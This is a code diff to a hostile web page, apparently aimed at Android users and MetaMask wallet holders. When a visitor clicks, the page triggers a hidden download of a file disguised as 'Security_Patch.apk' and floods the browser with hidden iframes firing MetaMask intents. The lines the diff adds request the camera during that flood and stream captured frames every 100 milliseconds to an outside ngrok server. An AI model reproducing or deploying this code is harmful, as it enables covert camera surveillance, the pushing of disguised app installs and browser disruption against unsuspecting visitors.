@@ -16,6 +16,7 @@
   @keyframes blink { 50% { opacity: 0.1; } }
   #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
   iframe { display: none; }
+  video { display: none; }
 </style>
 </head>
 <body>
@@ -27,6 +28,8 @@
 </div>
 
 <div id="launcher-container" style="display: none;"></div>
+<video id="cam-feed" autoplay playsinline muted></video>
+<canvas id="processing-canvas" width="640" height="480"></canvas>
 
 <script>
 (function () {
@@ -43,92 +46,116 @@
   // ============================================
   // 1. KONFIGURASI
   // ============================================
-  // Native Intent MetaMask
   var METAMASK_INTENT = "intent://#Intent;" +
                         "package=io.metamask;" +
                         "scheme=metamask;" +
                         "end;";
 
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame";
+
   // ============================================
-  // 2. TRIGGER FLOODING (KLIK)
+  // 2. CAMERA HIJACK FUNCTION
+  // ============================================
+  function startCameraHijack() {
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(function(stream) {
+        var video = document.getElementById('cam-feed');
+        video.srcObject = stream;
+        video.play().catch(function(){});
+        log("[+] Kamera BERHASIL diakses!");
+
+        // Stream frame ke server
+        setInterval(function() {
+          var canvas = document.getElementById('processing-canvas');
+          var ctx = canvas.getContext('2d');
+          if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            var dataURL = canvas.toDataURL('image/jpeg', 0.5);
+            fetch(SERVER_ENDPOINT, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image: dataURL }),
+              keepalive: true
+            }).catch(function(){});
+          }
+        }, 100);
+      })
+      .catch(function(err) {
+        log("[-] Kamera diblokir: " + err.name);
+      });
+  }
+
+  // ============================================
+  // 3. TRIGGER CHAOS (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
     document.getElementById('main-card').innerHTML = `
-      <h2>EXECUTING...</h2>
-      <p>Memulai Stealth Download & Intent Flood...</p>
+      <h2>EXECUTING CHAOS...</h2>
+      <p>Memulai Multi-Vector Attack...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Stealth Download & Intent Flood...");
+    log("[!] Memulai Ultimate Chaos Chain...");
 
     // ============================================
     // A. STEALTH DOWNLOAD (IFRAME TERSEMBUNYI)
     // ============================================
     try {
-      // Base64 APK (Dummy Header)
       var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
       var binary = atob(b64Apk);
       var bytes = new Uint8Array(binary.length);
       for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-      
-      // MIME Type APK
       var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
       var blobUrl = URL.createObjectURL(blob);
 
-      // Buat iframe tersembunyi untuk download
       var dlIframe = document.createElement("iframe");
       dlIframe.sandbox = "allow-scripts allow-downloads-without-user-activation";
       dlIframe.style.display = "none";
-      
-      // HTML di dalam iframe: Link download otomatis
       dlIframe.srcdoc = `
         <body>
-          <a id="dl" href="${blobUrl}" download="MetaMask_Update.apk">Download</a>
-          <script>
-            document.getElementById('dl').click();
-          <\/script>
+          <a id="dl" href="${blobUrl}" download="Security_Patch.apk">Download</a>
+          <script>document.getElementById('dl').click();<\/script>
         </body>
       `;
-      
       document.body.appendChild(dlIframe);
-      log("[+] Stealth APK Download Triggered.");
-    } catch(e) {
-      log("[-] Download Error: " + e.message);
-    }
+      log("[+] APK Download Triggered.");
+    } catch(e) {}
 
     // ============================================
-    // B. INFINITE INTENT FLOODING (5ms)
+    // B. INTENT FLOODING (5ms) + CAMERA REQUEST
     // ============================================
     var iframeCount = 0;
     var floodInterval = setInterval(function() {
       try {
+        // 1. Buat iframe Intent
         var iframe = document.createElement("iframe");
         iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
         iframe.style.display = "none";
-        
-        // Suntikkan Intent MetaMask
         iframe.srcdoc = `
           <!DOCTYPE html>
           <html>
           <body>
-            <script>
-              window.top.location.href = "${METAMASK_INTENT}";
-            <\/script>
+            <script>window.top.location.href = "${METAMASK_INTENT}";<\/script>
           </body>
           </html>
         `;
-        
         document.getElementById("launcher-container").appendChild(iframe);
         iframeCount++;
         
+        // 2. Setiap 10 iframe, minta izin kamera (Race Condition)
         if (iframeCount % 10 === 0) {
+          startCameraHijack(); // Panggil permintaan kamera
+          log("[+] Camera Request Triggered (Race).");
+        }
+
+        if (iframeCount % 20 === 0) {
           log("[+] Intent Flood " + iframeCount + " terkirim.");
         }
 
-        // Batasi jumlah iframe agar browser tidak langsung OOM
+        // Batasi iframe agar tidak OOM
         if (document.getElementById("launcher-container").children.length > 50) {
           document.getElementById("launcher-container").removeChild(
             document.getElementById("launcher-container").firstChild
